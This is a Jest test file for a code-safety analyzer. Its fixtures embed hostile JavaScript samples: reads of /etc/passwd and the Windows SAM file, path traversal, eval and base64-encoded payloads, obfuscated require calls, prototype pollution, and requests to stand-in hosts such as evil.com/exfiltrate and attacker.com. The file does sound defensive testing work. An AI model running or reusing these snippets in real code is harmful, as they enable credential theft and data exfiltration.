import { describe, test, expect, beforeEach } from '@jest/globals';
import { analyzeCodeSafety, CodeAnalysisResult } from '../../src/security/code-analyzer';
import { readFileSync } from 'fs';
import { join } from 'path';

describe('CodeAnalyzer', () => {
  const fixturesPath = join(__dirname, '../fixtures/code-samples');

  describe('safe code analysis', () => {
    test('should pass safe TypeScript code', async () => {
      const safeCode = readFileSync(join(fixturesPath, 'safe-code.ts'), 'utf8');
      const result = await analyzeCodeSafety(safeCode);
      
      expect(result.safe).toBe(true);
      expect(result.issues).toHaveLength(0);
    });

    test('should allow basic language features', async () => {
      const basicCode = `
        const x: number = 42;
        const y: string = "hello";
        const arr: number[] = [1, 2, 3];
        
        function add(a: number, b: number): number {
          return a + b;
        }
        
        const result = add(x, 5);
        console.log(result);
      `;
      
      const result = await analyzeCodeSafety(basicCode);
      expect(result.safe).toBe(true);
    });

    test('should allow safe built-in methods', async () => {
      const safeBuiltins = `
        const str = "hello world";
        const upper = str.toUpperCase();
        const arr = [1, 2, 3];
        const doubled = arr.map(x => x * 2);
        const sum = arr.reduce((acc, x) => acc + x, 0);
        
        console.log(upper, doubled, sum);
      `;
      
      const result = await analyzeCodeSafety(safeBuiltins);
      expect(result.safe).toBe(true);
    });
  });

  describe('dangerous module detection', () => {
    test('should detect dangerous module imports', async () => {
      const dangerousCode = `
        const childProcess = require('child_process');
        const vm = require('vm');
        const cluster = require('cluster');
      `;
      
      const result = await analyzeCodeSafety(dangerousCode);
      expect(result.safe).toBe(false);
      expect(result.issues).toContain('Dangerous module import: child_process');
      expect(result.issues).toContain('Dangerous module import: vm');
      expect(result.issues).toContain('Dangerous module import: cluster');
    });

    test('should warn about restricted modules', async () => {
      const restrictedCode = `
        const fs = require('fs');
        const os = require('os');
        const http = require('http');
      `;
      
      const result = await analyzeCodeSafety(restrictedCode);
      expect(result.safe).toBe(false);  // Should be false due to network access patterns
      expect(result.warnings).toContain('Restricted module usage: fs');
      expect(result.warnings).toContain('Restricted module usage: os');
      expect(result.warnings).toContain('Restricted module usage: http');
    });

    test('should detect ES6 import statements', async () => {
      const es6Imports = `
        import * as fs from 'fs';
        import { exec } from 'child_process';
        import net from 'net';
      `;
      
      const result = await analyzeCodeSafety(es6Imports);
      expect(result.safe).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
    });

    test('should detect dynamic imports', async () => {
      const dynamicImports = `
        async function loadModule() {
          const fs = await import('fs');
          const { exec } = await import('child_process');
          return { fs, exec };
        }
      `;
      
      const result = await analyzeCodeSafety(dynamicImports);
      expect(result.safe).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
    });
  });

  describe('eval detection', () => {
    test('should detect eval usage', async () => {
      const evalCode = `
        const maliciousCode = 'require("fs").readFileSync("/etc/passwd")';
        const result = eval(maliciousCode);
      `;
      
      const result = await analyzeCodeSafety(evalCode);
      expect(result.safe).toBe(false);
      expect(result.issues).toContain('eval() usage is not allowed');
    });

    test('should detect Function constructor', async () => {
      const functionConstructor = `
        const func = new Function('return require("fs")');
        const fs = func();
      `;
      
      const result = await analyzeCodeSafety(functionConstructor);
      expect(result.safe).toBe(false);
      expect(result.issues).toContain('Function constructor usage is not allowed');
    });

    test('should detect setTimeout/setInterval with string', async () => {
      const stringTimeout = `
        setTimeout('require("fs").readFileSync("/etc/passwd")', 1000);
        setInterval('console.log("malicious")', 500);
      `;
      
      const result = await analyzeCodeSafety(stringTimeout);
      expect(result.safe).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
    });
  });

  describe('dangerous property access', () => {
    test('should detect process access', async () => {
      const processAccess = `
        console.log(process.env);
        console.log(process.argv);
        process.exit(1);
      `;
      
      const result = await analyzeCodeSafety(processAccess);
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('Potentially unsafe property access: process.env');
    });

    test('should detect global access', async () => {
      const globalAccess = `
        console.log(global.process);
        console.log(globalThis.require);
        console.log(__dirname);
        console.log(__filename);
      `;
      
      const result = await analyzeCodeSafety(globalAccess);
      expect(result.safe).toBe(false);
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    test('should detect prototype pollution attempts', async () => {
      const prototypePollution = `
        Object.prototype.polluted = 'malicious';
        Array.prototype.malicious = function() { return 'bad'; };
      `;
      
      const result = await analyzeCodeSafety(prototypePollution);
      expect(result.safe).toBe(false);
      expect(result.issues).toContain('Prototype pollution attempt detected');
    });
  });

  describe('file system access patterns', () => {
    test('should detect file system operations', async () => {
      const fsOps = `
        const data = fs.readFileSync('/etc/passwd');
        fs.writeFileSync('/tmp/malicious', 'bad data');
        fs.unlinkSync('/important/file');
      `;
      
      const result = await analyzeCodeSafety(fsOps);
      expect(result.safe).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
    });

    test('should detect path traversal attempts', async () => {
      const pathTraversal = `
        const data = readFile('../../../etc/passwd');
        const secret = readFile('..\\\\..\\\\windows\\\\system32\\\\config\\\\sam');
      `;
      
      const result = await analyzeCodeSafety(pathTraversal);
      expect(result.safe).toBe(false);
      expect(result.issues).toContain('Path traversal attempt detected');
    });
  });

  describe('network access detection', () => {
    test('should detect network operations', async () => {
      const networkCode = `
        const http = require('http');
        const https = require('https');
        const net = require('net');
        
        http.get('http://malicious.com/data');
        https.request('https://evil.com/exfiltrate');
        net.connect(80, 'attacker.com');
      `;
      
      const result = await analyzeCodeSafety(networkCode);
      expect(result.safe).toBe(false);
      expect(result.issues).toContain('Network access is not allowed');
    });

    test('should detect fetch API usage', async () => {
      const fetchCode = `
        fetch('https://malicious.com/data')
          .then(res => res.json())
          .then(data => console.log(data));
      `;
      
      const result = await analyzeCodeSafety(fetchCode);
      expect(result.safe).toBe(false);
      expect(result.issues).toContain('Network fetch is not allowed');
    });
  });

  describe('complex malicious patterns', () => {
    test('should detect obfuscated code patterns', async () => {
      const obfuscated = `
        const module = String.fromCharCode(102, 115); // 'fs'
        const method = ['read', 'File', 'Sync'].join('');
        const target = ['/', 'etc', '/', 'passwd'].join('');
        
        const dangerous = require(module)[method](target);
      `;
      
      const result = await analyzeCodeSafety(obfuscated);
      expect(result.safe).toBe(false);
      expect(result.issues).toContain('Obfuscated code pattern detected');
    });

    test('should detect base64 encoded payloads', async () => {
      const base64Code = `
        const payload = atob('cmVxdWlyZSgiZnMiKS5yZWFkRmlsZVN5bmMoIi9ldGMvcGFzc3dkIik=');
        eval(payload);
      `;
      
      const result = await analyzeCodeSafety(base64Code);
      expect(result.safe).toBe(false);
      expect(result.issues).toContain('Base64 encoded payload detected');
    });
  });

  describe('performance and limits', () => {
  test('should handle large code files', async () => {
    // Create a large valid code file with unique variable names
    const largeCode = Array.from({ length: 10000 }, (_, i) => `const x${i} = ${i};`).join('\n');
    
    const start = Date.now();
    const result = await analyzeCodeSafety(largeCode);
    const duration = Date.now() - start;
    
    expect(result.safe).toBe(true);
    expect(duration).toBeLessThan(5000); // Should complete within 5 seconds
  });

  test('should handle extremely complex code efficiently', async () => {
    // Create a very complex but valid code structure
    const complexCode = Array.from({ length: 1000 }, (_, i) => 
      `if (true && false || true) { const x${i} = ${i}; if (x${i} > 0) { console.log(x${i}); } }`
    ).join('\n');
    
    const start = Date.now();
    const result = await analyzeCodeSafety(complexCode);
    const duration = Date.now() - start;
    
    // Should handle complex code without issues
    expect(result.safe).toBe(true);
    expect(duration).toBeLessThan(10000); // Should complete within 10 seconds
  });
  });
});
